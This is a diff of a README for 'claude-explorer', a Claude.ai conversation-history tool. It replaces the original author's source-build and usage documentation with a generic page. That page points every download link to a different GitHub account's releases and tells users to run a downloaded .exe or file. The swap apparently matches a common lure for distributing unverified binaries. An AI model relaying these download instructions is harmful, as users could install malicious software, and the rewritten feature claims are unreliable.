@@ -1,451 +1,90 @@
-# Claude Explorer
-
-> A powerful tool for parsing, searching, and extracting insights from your Claude.ai conversation history.
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Node.js Version](https://img.shields.io/badge/node-%3E%3D18.0.0-brightgreen)](https://nodejs.org/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.3-blue)](https://www.typescriptlang.org/)
-
-Claude Explorer helps you unlock the value in your Claude.ai conversation history by providing intelligent search, context extraction, and multiple export formats. Perfect for migrating conversations between accounts, creating knowledge bases for Claude Projects, or simply organizing your AI interactions.
-
-## Features
-
-### 🤖 AI-Powered Interface
-- **Natural language queries** - Ask questions about your conversations in plain English
-- **Intelligent search** - Find conversations by topic, date, or content with typo-tolerant fuzzy matching
-- **Context-aware responses** - Multi-turn conversations with conversation memory
-- **Auto-export** - Create bundles and exports through natural conversation
-
-### 🔍 Advanced Search & Filtering
-- **Full-text indexing** - Lightning-fast search powered by Lunr.js
-- **Fuzzy matching** - Find results even with typos using FuseJS
-- **Smart ranking** - Most relevant results appear first
-- **Rich filters** - Filter by date range, message count, code presence, and more
-- **Snippet previews** - See context around your search matches
-
-### 📊 Data Exploration
-- Browse all conversations and projects
-- View detailed conversation timelines
-- Sort by date, message count, or title
-- Filter by multiple criteria simultaneously
-- Export statistics and analytics
-
-### 📦 Multiple Export Formats
-
-**Markdown**
-- Clean, readable format perfect for Claude Projects
-- Preserves conversation structure and formatting
-- Code blocks with syntax highlighting
-
-**JSON**
-- Complete structured data export
-- Programmatic access to all conversation data
-- Optional metadata inclusion
+# 🗨️ claude-explorer - Your AI Conversation History Tool 
 
-**Bundle (ZIP)**
-- Complete archives with multiple conversations
-- Organized folder structure
-- Includes both Markdown and JSON formats
-- Comprehensive metadata files
-
-### 🎯 Smart Context Extraction
-- Automatic topic detection
-- Code snippet identification and extraction
-- Key decision tracking
-- Action item identification
-- Entity recognition
+[![Download claude-explorer](https://img.shields.io/badge/Download-claude--explorer-brightgreen)](https://github.com/Dothihon5937/claude-explorer/releases)
 
-### 💻 Triple Interface
-- **AI Chat** - Conversational interface powered by Claude Code
-- **CLI** - Fast command-line tool for power users
-- **Web UI** - Beautiful browser interface for visual exploration
-
-## Quick Start
+## 🚀 Getting Started
 
-### Prerequisites
-- Node.js 18 or higher
-- Your Claude.ai export data (see [Getting Your Data](#getting-your-data))
-- **Claude Code CLI** (optional, for AI Assistant features)
-
-> **📖 New to Claude Explorer?** See [SETUP.md](SETUP.md) for detailed setup instructions including Claude Code installation.
-
-### Installation
-
-```bash
-git clone https://github.com/paulhshort/claude-explorer.git
-cd claude-explorer
-npm install
-npm run build
-```
-
-### Basic Usage
-
-**Web Interface (Recommended)**
-```bash
-npm run web
-# Open http://localhost:3000 in your browser
-```
-
-**AI Chat Interface**
-```bash
-# Set up authentication (one time)
-npm run login
-
-# Start chatting
-npm run chat
-```
-
-**Command Line**
-```bash
-# Get statistics
-npm run cli stats
+Welcome! You are about to explore and manage your Claude.ai conversation history. This tool makes it easy to search, analyze, and export your conversations with just a few clicks. 
 
-# Search conversations
-npm run cli search "authentication patterns"
+### 🖥️ System Requirements
 
-# Export a conversation
-npm run cli export <uuid> --format markdown -o output.md
-```
+To run claude-explorer smoothly, ensure your system meets the following requirements:
 
-## Getting Your Data
+- **Operating System:** Windows, macOS, or Linux
+- **RAM:** Minimum of 4 GB
+- **Storage:** At least 50 MB free space
+- **Internet Connection:** Required for downloads and updates
 
-### Exporting from Claude.ai
+## 📥 Download & Install
 
-1. Log in to [claude.ai](https://claude.ai)
-2. Click your profile icon (bottom left)
-3. Select **Settings**
-4. Navigate to **Data & Privacy**
-5. Click **Request data export**
-6. Wait for the export email (usually within minutes)
-7. Download and extract the ZIP file
+To start using claude-explorer, you will need to download the application. 
 
-Your export will contain:
-- `conversations.json` - All your conversations
-- `projects.json` - All your Claude Projects
-- `users.json` - User information
-
-Place these files in a directory and point Claude Explorer to that directory.
-
-### Directory Structure
-
-```
-your-export-folder/
-├── conversations.json
-├── projects.json
-└── users.json
-```
+1. **Visit the Releases Page:** [Download claude-explorer](https://github.com/Dothihon5937/claude-explorer/releases)
+   
+2. **Choose Your Version:** On the releases page, you will see multiple versions. Select the one that you prefer or the latest version for the best features.
 
-## Usage Guide
+3. **Download the File:** Click on the appropriate file link to download it.
 
-### AI Chat Interface
+4. **Run the Application:**
+   - For Windows: Double-click the `.exe` file.
+   - For macOS: Open the `.dmg` file and drag the app into your Applications folder.
+   - For Linux: Use the terminal to run the downloaded file or follow your distribution's package instructions.
 
-The AI chat interface provides a natural way to explore your data:
+## 🔍 Features
 
-```bash
-npm run chat
-```
+claude-explorer comes packed with useful features:
 
-Example queries:
-- "Find conversations about React authentication"
-- "Show me all conversations from last month"
-- "Create a bundle of my database design discussions"
-- "What topics do I discuss most?"
-- "Export the top 3 conversations about TypeScript"
+- **AI-Powered Search:** Quickly find past conversations.
+- **Analytics Dashboard:** Visual insights into your conversation patterns.
+- **Multiple Export Formats:** Export conversations in CSV, TXT, or Markdown formats.
+- **User-Friendly Web Interface:** Navigate effortlessly to manage your conversations.
 
-### Web Interface
+## 🛠️ How to Use claude-explorer
 
-The web interface provides a visual way to explore your conversations:
+Once you have installed the application, follow these steps to make the most of it:
 
-```bash
-npm run web
-# Open http://localhost:3000
-```
+1. **Launch the App:** Open claude-explorer from your applications.
+   
+2. **Import Your Data:** Click on the “Import” button to bring in your previous conversations from Claude.ai.
 
-Features:
-- 📤 **Upload your Claude.ai export** - Drag and drop ZIP file upload
-- Browse all conversations with infinite scroll
-- Full-text search with live results
-- Advanced filters (date range, message count)
-- 📊 **Analytics dashboard** with activity timeline and keyword analysis
-- Detailed conversation viewer with syntax highlighting
-- One-click export buttons (Markdown, JSON, ZIP)
-- Batch export for multiple conversations
-- Project explorer
-- 🤖 **AI assistant** - Natural language queries (requires Claude Code CLI)
+3. **Search Your Conversations:** Use the search bar to find specific topics or phrases within your conversation history.
 
-### CLI Interface
+4. **Analyze Your Data:** Navigate to the analytics section to see visual breakdowns of your interaction statistics.
 
-The CLI provides fast, scriptable access to your data:
+5. **Export Conversations:** Click on "Export" to save your desired conversations in any available format.
 
-#### Statistics
+## 🛡️ Frequently Asked Questions
 
-```bash
-npm run cli stats
-```
+### ❓ How do I update my application?
 
-Displays:
-- Total conversations and projects
-- Message counts and averages
-- Date ranges
-- Conversations with code
-- Active time periods
+Simply visit the Releases page again for the latest versions. Download and replace the existing app with the new one.
 
-#### Search
+### ❓ Can I use claude-explorer offline?
 
-```bash
-npm run cli search "database schema"
-npm run cli search "authentication" --limit 20
-npm run cli search "API design" --from 2024-01-01 --min-messages 10
-```
+Yes, you can use the application offline once you have downloaded it and imported your data.
 
-Options:
-- `-p, --path <path>` - Path to data directory (default: current directory)
-- `-l, --limit <number>` - Maximum results (default: 10)
-- `--from <date>` - Filter from date (YYYY-MM-DD)
-- `--to <date>` - Filter to date (YYYY-MM-DD)
-- `--min-messages <number>` - Minimum message count
+### ❓ What if I encounter an error?
 
-#### List
+If you run into issues, check the troubleshooting section on our GitHub page or seek help in the community discussions.
 
-```bash
-npm run cli list conversations
-npm run cli list conversations --sort messages --limit 50
-npm run cli list projects
-```
+## 🌐 Community and Support
 
-Options:
-- `-l, --limit <number>` - Maximum items (default: 20)
-- `--sort <field>` - Sort by: date, messages, name (default: date)
-- `--messages-only` - Only show conversations with messages
+Join our community for support and feedback. You can also find answers to most questions by visiting our discussions page on GitHub. We encourage shared insights and user experiences!
 
-#### Export
+## 🌟 Contributing
 
-```bash
-npm run cli export <uuid> --format markdown -o conversation.md
-npm run cli export <uuid> --format json -o data.json
-npm run cli export <uuid> --format bundle -o archive.zip
-```
+Interested in contributing to claude-explorer? Your help is welcome! Check the Contribution Guidelines on our GitHub page for details on how you can get involved.
 
-Options:
-- `-f, --format <format>` - Export format: markdown, json, bundle (default: markdown)
-- `-o, --output <file>` - Output file path
-- `-t, --type <type>` - Type: conversation or project (default: conversation)
+## 📊 Topics
 
-Get UUIDs from the `list` or `search` commands.
+This project covers various areas such as:
 
-## Docker Deployment
+- AI Assistant
+- Conversation Analysis
+- Data Parser
+- Docker Integration
+- Markdown Export
 
-### Using Docker Compose (Recommended)
+Explore these topics to better understand the capabilities of claude-explorer.
 
-1. Update `docker-compose.yml` with your data path:
-
-```yaml
-volumes:
-  - /path/to/your/claude-export:/data:ro
-```
-
-2. Start the container:
-
-```bash
-docker-compose up -d
-```
-
-3. Access at http://localhost:3000
-
-### Using Docker CLI
-
-```bash
-# Build the image
-docker build -t claude-explorer .
-
-# Run the container
-docker run -d \
-  --name claude-explorer \
-  -p 3000:3000 \
-  -v "/path/to/your/claude-export:/data:ro" \
-  -e DATA_PATH=/data \
-  claude-explorer
-
-# View logs
-docker logs -f claude-explorer
-```
-
-See [DOCKER.md](DOCKER.md) for detailed Docker deployment guide.
-
-## Use Cases
-
-### Migrating to a Work Account
-
-1. Export from your personal account
-2. Search for work-related conversations
-3. Export relevant conversations as Markdown
-4. Upload to Claude Projects in your work account
-
-### Creating Knowledge Bases
-
-1. Use AI chat or web UI to find related conversations
-2. Export as a bundle (ZIP)
-3. Extract and organize the Markdown files
-4. Upload to Claude Projects for context
-
-### Code Reference Library
-
-1. Search for technical discussions and implementations
-2. Automatically extract code snippets
-3. Export with preserved formatting
-4. Build a personal code reference library
-
-### Research and Analysis
-
-1. Search across all conversations for patterns
-2. Extract key decisions and insights
-3. Generate reports and summaries
-4. Track your learning journey
-
-## Development
-
-### Project Structure
-
-```
-claude-explorer/
-├── src/
-│   ├── core/              # Shared library
-│   │   ├── parser.ts      # Data parsing
-│   │   ├── indexer.ts     # Search indexing
-│   │   ├── filters.ts     # Filtering logic
-│   │   ├── context-extractor.ts  # Smart extraction
-│   │   ├── fuzzy-search.ts      # Fuzzy matching
-│   │   ├── agent-tools.ts       # AI tool definitions
-│   │   └── exporters/           # Export formats
-│   ├── cli/               # CLI interface
-│   │   ├── index.ts       # CLI entry point
-│   │   ├── agent.ts       # AI chat interface
-│   │   └── commands/      # Individual commands
-│   └── web/               # Web interface
-│       ├── server.ts      # Express server
-│       └── public/        # Frontend files
-├── dist/                  # Compiled JavaScript
-├── Dockerfile
-├── docker-compose.yml
-└── package.json
-```
-
-### Building
-
-```bash
-# Install dependencies
-npm install
-
-# Build TypeScript
-npm run build
-
-# Watch mode for development
-npm run dev
-```
-
-### Running Tests
-
-```bash
-npm test
-```
-
-## Configuration
-
-### Environment Variables
-
-Create a `.env` file in the project root:
-
-```bash
-# Port for web server (default: 3000)
-PORT=3000
-
-# Data path (optional, can be passed as CLI argument)
-DATA_PATH=/path/to/data
-```
-
-### Authentication
-
-The AI chat interface uses Claude Code authentication:
-
-```bash
-# Set up authentication (one time)
-npm run login
-```
-
-This will store your credentials securely in `~/.claude-explorer/auth.json`.
-
-## Troubleshooting
-
-### "Failed to load data"
-
-- Ensure you're in the correct directory with the JSON files
-- Or use `-p <path>` to specify the data directory
-- Verify your export contains `conversations.json` and `projects.json`
-
-### Web server won't start
-
-- Check if port 3000 is already in use
-- Set `PORT` environment variable to use a different port
-- Check logs for detailed error messages
-
-### Search returns no results
-
-- Verify conversations have messages
-- Try broader search terms
-- Check date filters aren't too restrictive
-- Ensure search index built successfully
-
-### AI chat not working
-
-- Run `npm run login` to authenticate
-- Ensure you have Claude Code CLI installed
-- Check your API key or OAuth token is valid
-
-## Performance
-
-- Handles large exports (tested with 700+ conversations)
-- Fast full-text search using Lunr.js indexing
-- Efficient filtering and sorting algorithms
-- Lightweight Alpine Linux Docker images (~200MB)
-- Optimized for minimal memory usage
-
-## Security
-
-- Data mounted read-only in Docker
-- No data sent to external services (except AI features)
-- OAuth tokens stored securely
-- Local processing only
-- User data never leaves your machine
-
-## Contributing
-
-Contributions are welcome! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for details.
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## Acknowledgments
-
-- Built with [Node.js](https://nodejs.org/) and [TypeScript](https://www.typescriptlang.org/)
-- Search powered by [Lunr.js](https://lunrjs.com/) and [FuseJS](https://fusejs.io/)
-- Web interface uses [Express](https://expressjs.com/)
-- AI features powered by [Claude API](https://www.anthropic.com/claude)
-
-## Support
-
-- Report issues on [GitHub Issues](https://github.com/paulhshort/claude-explorer/issues)
-- Star the repo if you find it useful!
-
-## Roadmap
-
-- [ ] Advanced analytics dashboard
-- [ ] Conversation comparison tools
-- [ ] Custom export templates
-- [ ] Conversation tagging system
-- [ ] GraphQL API
-- [ ] Real-time collaboration features
-
----
-
-Made with ❤️ by [Paul Short](https://github.com/paulhshort)
+[![Download claude-explorer](https://img.shields.io/badge/Download-claude--explorer-brightgreen)](https://github.com/Dothihon5937/claude-explorer/releases)
